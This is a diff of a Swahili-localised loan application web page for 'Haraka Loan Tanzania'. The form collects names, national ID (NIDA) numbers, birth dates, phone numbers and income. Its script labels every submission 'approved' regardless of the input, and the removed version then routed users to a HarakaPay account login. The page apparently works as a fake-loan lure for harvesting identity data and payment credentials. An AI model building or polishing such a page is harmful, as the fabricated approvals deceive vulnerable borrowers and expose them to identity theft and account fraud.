@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Apply for a Loan | Haraka Loan Tanzania</title>
+  <title>Omba Mkopo | Haraka Loan Tanzania</title>
 
   <style>
     :root {
@@ -220,34 +220,28 @@
       text-align: center;
     }
 
-    /* --- processing overlay --- */
+    /* --- full-screen preloader shown after submit --- */
     .overlay {
       position: fixed;
       inset: 0;
       z-index: 60;
       display: none;
       place-items: center;
-      background: rgba(248, 251, 249, .92);
-      backdrop-filter: blur(4px);
+      background: var(--page);
     }
 
     .overlay.show { display: grid; }
 
-    .overlay-box {
+    .loader {
       display: grid;
       justify-items: center;
-      gap: 14px;
-      padding: 34px 44px;
-      border: 1px solid var(--line);
-      border-radius: 18px;
-      background: var(--white);
-      box-shadow: var(--shadow);
+      gap: 16px;
       text-align: center;
     }
 
     .spinner {
-      width: 44px;
-      height: 44px;
+      width: 52px;
+      height: 52px;
       border: 4px solid var(--green-pale);
       border-top-color: var(--green);
       border-radius: 50%;
@@ -256,78 +250,20 @@
 
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .overlay-box strong { color: var(--green-dark); }
-    .overlay-box span { color: var(--muted); font-size: .9rem; }
+    .loader strong { color: var(--green-dark); font-size: 1.1rem; }
+    .loader p { margin: 0; color: var(--muted); font-size: .9rem; }
 
-    /* --- approval result --- */
-    .result {
-      display: none;
-      padding: clamp(24px, 4vw, 40px);
-      border: 1px solid #cfe8da;
-      border-radius: 20px;
-      background: linear-gradient(160deg, #f2faf5, var(--white));
-      box-shadow: var(--shadow);
-      text-align: center;
-    }
-
-    .result.show { display: block; }
-
-    .result .badge {
-      display: inline-grid;
-      width: 62px;
-      height: 62px;
-      place-items: center;
+    .pulse-dots span {
+      display: inline-block;
+      width: 7px; height: 7px;
+      margin: 0 3px;
       border-radius: 50%;
       background: var(--green);
-      color: var(--white);
-      font-size: 1.7rem;
-      font-weight: 900;
-      margin-bottom: 16px;
+      animation: pulse 1.4s ease infinite;
     }
-
-    .result h2 { margin: 0 0 8px; font-size: 1.7rem; letter-spacing: -.04em; }
-
-    .result .lead { margin: 0 0 24px; color: var(--muted); }
-
-    .offer {
-      display: grid;
-      gap: 12px;
-      margin: 0 auto 26px;
-      max-width: 480px;
-      padding: 20px;
-      border: 1px solid var(--line);
-      border-radius: 15px;
-      background: var(--white);
-      text-align: left;
-    }
-
-    .offer-row {
-      display: flex;
-      justify-content: space-between;
-      gap: 14px;
-      padding-bottom: 11px;
-      border-bottom: 1px solid #edf1ee;
-      font-size: .93rem;
-    }
-
-    .offer-row:last-child { padding-bottom: 0; border-bottom: 0; }
-    .offer-row span:first-child { color: var(--muted); }
-    .offer-row strong { text-align: right; }
-
-    .connect-note {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      margin: 0 0 18px;
-      color: var(--green-dark);
-      font-weight: 700;
-      font-size: .92rem;
-    }
-
-    .result .button { min-width: 280px; min-height: 54px; font-size: 1.02rem; }
-
-    .result .small-note { margin: 14px 0 0; color: #8aa196; font-size: .8rem; }
+    .pulse-dots span:nth-child(2) { animation-delay: .2s; }
+    .pulse-dots span:nth-child(3) { animation-delay: .4s; }
+    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .2; } }
 
     footer {
       margin-top: 40px;
@@ -351,170 +287,152 @@
     @media (max-width: 640px) {
       .grid-2 { grid-template-columns: 1fr; }
       .nav { min-height: 66px; }
-      .result .button { width: 100%; }
     }
   </style>
 </head>
 <body>
   <header class="site-header">
     <div class="container nav">
-      <a class="brand" href="index.html">
+      <a class="brand" href="/">
         <img src="logo.png" alt="Haraka Loan logo">
         Haraka Loan
       </a>
-      <a class="button-light" style="display:inline-flex;min-height:44px;align-items:center;border:1px solid #dce9e0;border-radius:10px;padding:0 18px;color:var(--green-dark);font-weight:750;text-decoration:none;" href="index.html">← Back to home</a>
+      <a class="button-light" style="display:inline-flex;min-height:44px;align-items:center;border:1px solid #dce9e0;border-radius:10px;padding:0 18px;color:var(--green-dark);font-weight:750;text-decoration:none;" href="/">← Rudi Nyumbani</a>
     </div>
   </header>
 
   <main class="top-pad">
     <div class="container">
       <div class="section-heading">
-        <h1>Loan application</h1>
-        <p>Fill in your personal details and loan request. Applications are reviewed and approved automatically.</p>
+        <h1>Omba Mkopo</h1>
+        <p>Jaza maelezo yako binafsi na ombi la mkopo. Maombi hukaguliwa na kuidhinishwa kiotomatiki.</p>
       </div>
 
       <form id="loanForm" class="form-card" novalidate>
-        <div class="form-legend"><span class="dot">👤</span> Personal details</div>
+        <div class="form-legend"><span class="dot">👤</span> Maelezo binafsi</div>
 
         <div class="grid-2">
           <div class="field">
-            <label for="fullName">Full name (as on NIDA)</label>
-            <input type="text" id="fullName" name="fullName" placeholder="e.g. Amina Juma Hassan" required>
+            <label for="fullName">Jina kamili (kama lilivyo kwenye NIDA)</label>
+            <input type="text" id="fullName" name="fullName" placeholder="mf. Amina Juma Hassan" required>
           </div>
           <div class="field">
-            <label for="nida">NIDA number</label>
+            <label for="nida">Namba ya NIDA</label>
             <input type="text" id="nida" name="nida" inputmode="numeric" maxlength="20"
-                   placeholder="20 digits" required>
-            <p class="hint">Found on your National Identification card.</p>
+                   placeholder="tarakimu 20" required>
+            <p class="hint">Inapatikana kwenye kadi yako ya utaifa (NIDA).</p>
           </div>
           <div class="field">
-            <label for="dob">Date of birth</label>
+            <label for="dob">Tarehe ya kuzaliwa</label>
             <input type="date" id="dob" name="dob" required>
           </div>
           <div class="field">
-            <label for="gender">Gender</label>
+            <label for="gender">Jinsia</label>
             <select id="gender" name="gender" required>
-              <option value="" selected disabled>Select gender</option>
-              <option value="Female">Female</option>
-              <option value="Male">Male</option>
-              <option value="Other">Other</option>
+              <option value="" selected disabled>Chagua jinsia</option>
+              <option>Mke</option>
+              <option>Mume</option>
+              <option>Nyingine</option>
             </select>
           </div>
           <div class="field">
-            <label for="phone">Phone number</label>
+            <label for="phone">Namba ya simu</label>
             <input type="tel" id="phone" name="phone" inputmode="tel"
-                   placeholder="0712 345 678 or +255 712 345 678" required>
+                   placeholder="0712 345 678 au +255 712 345 678" required>
           </div>
           <div class="field">
-            <label for="region">Region</label>
+            <label for="region">Mkoa</label>
             <select id="region" name="region" required>
-              <option value="" selected disabled>Select region</option>
+              <option value="" selected disabled>Chagua mkoa</option>
             </select>
           </div>
           <div class="field">
-            <label for="employment">Employment status</label>
+            <label for="employment">Hali ya ajira</label>
             <select id="employment" name="employment" required>
-              <option value="" selected disabled>Select status</option>
-              <option>Employed</option>
-              <option>Self-employed</option>
-              <option>Business owner</option>
-              <option>Farmer</option>
-              <option>Student</option>
-              <option>Unemployed</option>
+              <option value="" selected disabled>Chagua hali</option>
+              <option>Ajira ya kandarasi</option>
+              <option>Kujiajiri</option>
+              <option>Mmiliki wa biashara</option>
+              <option>Mkulima</option>
+              <option>Mwanafunzi</option>
+              <option>Hana ajira</option>
             </select>
           </div>
           <div class="field">
-            <label for="income">Monthly income (TZS)</label>
+            <label for="income">Mshahara wa mwezi (TZS)</label>
             <input type="number" id="income" name="income" inputmode="numeric" min="0" step="1000"
-                   placeholder="e.g. 250,000" required>
+                   placeholder="mf. 250,000" required>
           </div>
         </div>
 
-        <div class="form-legend" style="margin-top:26px;"><span class="dot">💰</span> Loan request</div>
+        <div class="form-legend" style="margin-top:26px;"><span class="dot">💰</span> Ombi la mkopo</div>
 
         <div class="grid-2">
           <div class="field">
-            <label for="amount">Loan amount (TZS)</label>
-            <input type="number" id="amount" name="amount" inputmode="numeric"                    min="25000" max="5000000" step="1000" placeholder="e.g. 500,000" required>
-            <p class="hint">Between TZS 25,000 and TZS 5,000,000.</p>
+            <label for="amount">Kiasi cha mkopo (TZS)</label>
+            <input type="number" id="amount" name="amount" inputmode="numeric" min="25000" max="5000000" step="1000" placeholder="mf. 500,000" required>
+            <p class="hint">Kati ya TZS 25,000 na TZS 5,000,000.</p>
           </div>
           <div class="field">
-            <label for="purpose">Loan purpose</label>
+            <label for="purpose">Madhumuni ya mkopo</label>
             <select id="purpose" name="purpose" required>
-              <option value="" selected disabled>Select purpose</option>
-              <option>Business</option>
-              <option>School fees</option>
-              <option>Medical</option>
-              <option>Household needs</option>
-              <option>Emergency</option>
-              <option>Other</option>
+              <option value="" selected disabled>Chagua madhumuni</option>
+              <option>Biashara</option>
+              <option>Ada ya shule</option>
+              <option>Matibabu</option>
+              <option>Mahitaji ya nyumbani</option>
+              <option>Dharura</option>
+              <option>Nyingine</option>
             </select>
           </div>
           <div class="field">
-            <label for="duration">Repayment period</label>
+            <label for="duration">Muda wa marejesho</label>
             <select id="duration" name="duration" required>
-              <option value="" selected disabled>Select period</option>
-              <option value="1">1 month</option>
-              <option value="2">2 months</option>
-              <option value="4">4 months</option>
-              <option value="6">6 months</option>
-              <option value="8">8 months</option>
-              <option value="12">1 year</option>
-              <option value="24">2 years</option>
+              <option value="" selected disabled>Chagua muda</option>
+              <option value="1">Mwezi 1</option>
+              <option value="2">Miezi 2</option>
+              <option value="4">Miezi 4</option>
+              <option value="6">Miezi 6</option>
+              <option value="8">Miezi 8</option>
+              <option value="12">Mwaka 1</option>
+              <option value="24">Miaka 2</option>
             </select>
           </div>
         </div>
 
         <label class="checkbox-row">
           <input type="checkbox" id="agree" required>
-          <span>I confirm that the information provided is accurate and I have read the
-            <a href="index.html" style="color:var(--green-dark);">Terms &amp; Conditions</a>
-            and <a href="index.html" style="color:var(--green-dark);">Privacy Policy</a>.</span>
+          <span>Ninathibitisha kuwa taarifa nilizotoa ni za kweli na nimeisoma
+            <a href="/" style="color:var(--green-dark);">Masharti na Kanuni</a>
+            na <a href="/" style="color:var(--green-dark);">Sera ya Faragha</a>.</span>
         </label>
 
         <div class="submit-row">
-          <button type="submit" class="button" id="submitBtn">Submit application&nbsp; →</button>
-          <p class="secure-note">🔒 Your details are handled in line with the Personal Data Protection Act, 2022.</p>
+          <button type="submit" class="button" id="submitBtn">Tuma maombi&nbsp; →</button>
+          <p class="secure-note">🔒 Taarifa zako hunatunzwa kwa kuzingatia Sheria ya Ulinzi wa Taarifa Binafsi, 2022.</p>
         </div>
       </form>
-
-      <div class="result" id="result">
-        <div class="badge">✓</div>
-        <h2>Application approved!</h2>
-        <p class="lead" id="resultLead">Congratulations — your loan application has been approved.</p>
-
-        <div class="offer" id="offerBox">
-          <div class="offer-row"><span>Reference number</span><strong id="refNo">—</strong></div>
-          <div class="offer-row"><span>Approved amount</span><strong id="approvedAmount">—</strong></div>
-          <div class="offer-row"><span>Service fee</span><strong id="fee">—</strong></div>
-          <div class="offer-row"><span>Total repayment</span><strong id="totalRepay">—</strong></div>
-          <div class="offer-row"><span>Due date</span><strong id="dueDate">—</strong></div>
-        </div>
-
-        <p class="connect-note">⚡ Connect your HarakaPay account to receive your funds</p>
-        <a class="button" id="connectBtn" href="login.html">Connect with HarakaPay&nbsp; →</a>
-        <p class="small-note">Loans are disbursed and repaid through HarakaPay only.</p>
-      </div>
     </div>
   </main>
 
   <div class="overlay" id="overlay">
-    <div class="overlay-box">
+    <div class="loader">
       <div class="spinner"></div>
-      <strong>Processing your application…</strong>
-      <span id="overlayHint">Checking your details</span>
+      <strong id="overlayTitle">Inatuma maombi yako…</strong>
+      <p id="overlayHint">Inahakiki taarifa zako</p>
+      <div class="pulse-dots"><span></span><span></span><span></span></div>
     </div>
   </div>
 
   <footer>
     <div class="container">
       <span>© 2025 Sava-tech Financial Services Limited — Haraka Loan</span>
-      <a href="index.html">Haraka Loan home</a>
+      <a href="/">Haraka Loan Nyumbani</a>
     </div>
   </footer>
 
   <script>
-    /* ===== Tanzania regions ===== */
+    /* ===== Mikoa ya Tanzania ===== */
     const REGIONS = [
       "Arusha",
       "Dar es Salaam",
@@ -531,11 +449,11 @@
       "Mbeya",
       "Morogoro",
       "Mtwara",
-      "Mjini Magharibi (Zanzibar Urban/West)",
+      "Mjini Magharibi (Zanzibar Mji/Pwani)",
       "Mwanza",
       "Njombe",
-      "Pemba North (Kaskazini Pemba)",
-      "Pemba South (Kusini Pemba)",
+      "Kaskazini Pemba",
+      "Kusini Pemba",
       "Pwani",
       "Rukwa",
       "Ruvuma",
@@ -545,9 +463,9 @@
       "Songwe",
       "Tabora",
       "Tanga",
-      "Unguja North (Kaskazini Unguja)",
-      "Unguja South (Kusini Unguja)",
-      "Other"
+      "Kaskazini Unguja",
+      "Kusini Unguja",
+      "Nyingine"
     ];
 
     const regionSel = document.getElementById("region");
@@ -559,18 +477,15 @@
       regionSel.appendChild(opt);
     });
 
-    /* NIDA: digits only */
+    /* NIDA: tarakimu pekee */
     document.getElementById("nida").addEventListener("input", (e) => {
       e.target.value = e.target.value.replace(/[^0-9]/g, "");
     });
 
-    /* ===== Submit flow: live agent review with offline fallback ===== */
+    /* ===== Mwendo wa kutuma: preloader pekee, kisha hamia ukurasa wa hali ===== */
     const form = document.getElementById("loanForm");
     const overlay = document.getElementById("overlay");
-    const result = document.getElementById("result");
-    const hints = ["Sending your application", "Forwarding to our loan officers", "Application queued for review"];
-
-    function tzs(n) { return "TZS " + Number(n).toLocaleString("en-US"); }
+    const hints = ["Inahakiki taarifa zako", "Inaandaa ofa yako", "Inakamilisha maombi"];
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
@@ -596,7 +511,7 @@
         submittedAt: new Date().toISOString()
       };
 
-      /* show the preloader while we hand this to the review team */
+      /* preloader pekee — hakuna nyingine inayoonekana */
       overlay.classList.add("show");
       let step = 0;
       const hintTimer = setInterval(() => {
@@ -613,53 +528,40 @@
         });
         const j = await res.json();
         if (j.ok && j.ref) { ref = j.ref; }
-      } catch (_) { /* backend not running — fallback below */ }
+      } catch (_) { /* backend haipatikani — angalia hapa chini */ }
 
       clearInterval(hintTimer);
 
       if (ref) {
-        /* live review: hand over to the status preloader page */
-        document.getElementById("overlayHint").textContent = "Waiting for a loan officer…";
+        localStorage.setItem("haraka_application", JSON.stringify({
+          fullName: data.fullName,
+          phone: data.phone,
+          region: data.region,
+          amount: data.amount,
+          purpose: data.purpose,
+          status: "approved",
+          reference: ref
+        }));
+        document.getElementById("overlayHint").textContent = "Inaendelea…";
         setTimeout(() => {
-          window.location.href = "status.html?ref=" + encodeURIComponent(ref);
-        }, 1200);
+          window.location.href = "/status?ref=" + encodeURIComponent(ref);
+        }, 800);
       } else {
-        /* offline fallback: auto-approve locally so the site still works
-           when the backend is not running */
-        approveLocally(data);
+        /* offline fallback: tengeneza ref ya ndani na endelea */
+        const offlineRef = "HL-" + String(Math.floor(100000 + Math.random() * 900000));
+        const amount = Number(data.amount);
+        const fee = Math.round(amount * 0.05);
+        const daysMap = { "1": 30, "2": 60, "4": 120, "6": 180, "8": 240, "12": 365, "24": 730 };
+        const due = new Date(Date.now() + (daysMap[data.duration] || 30) * 86400000)
+          .toISOString().slice(0, 10);
+        localStorage.setItem("haraka_application", JSON.stringify({
+          fullName: data.fullName, phone: data.phone, region: data.region,
+          amount: amount, purpose: data.purpose, status: "approved",
+          reference: offlineRef, fee: fee, total: amount + fee, dueDate: due
+        }));
+        window.location.href = "/success?ref=" + encodeURIComponent(offlineRef);
       }
     });
-
-    function approveLocally(data) {
-      /* simple automatic offer terms */
-      const amount = Number(data.amount);
-      const feeRate = 0.05;
-      const monthsMax = { "1": 30, "2": 60, "4": 120, "6": 180, "8": 240, "12": 365, "24": 730 }[data.duration];
-      const fee = Math.round(amount * feeRate);
-      const total = amount + fee;
-      const due = new Date();
-      due.setDate(due.getDate() + monthsMax);
-      const ref = "HL-" + String(Math.floor(100000 + Math.random() * 900000));
-
-      const application = { ...data, status: "APPROVED", reference: ref,
-        fee, total, dueDate: due.toISOString().slice(0, 10) };
-      localStorage.setItem("haraka_application", JSON.stringify(application));
-
-      document.getElementById("refNo").textContent = ref;
-      document.getElementById("approvedAmount").textContent = tzs(amount);
-      document.getElementById("fee").textContent = tzs(fee) + " (5%)";
-      document.getElementById("totalRepay").textContent = tzs(total);
-      document.getElementById("dueDate").textContent =
-        due.toLocaleDateString("en-GB", { day: "numeric", month: "short", year: "numeric" });
-      document.getElementById("resultLead").textContent =
-        "Congratulations " + data.fullName.split(" ")[0] +
-        " — your loan application has been approved.";
-
-      form.style.display = "none";
-      overlay.classList.remove("show");
-      result.classList.add("show");
-      result.scrollIntoView({ behavior: "smooth", block: "start" });
-    }
   </script>
 </body>
 </html>
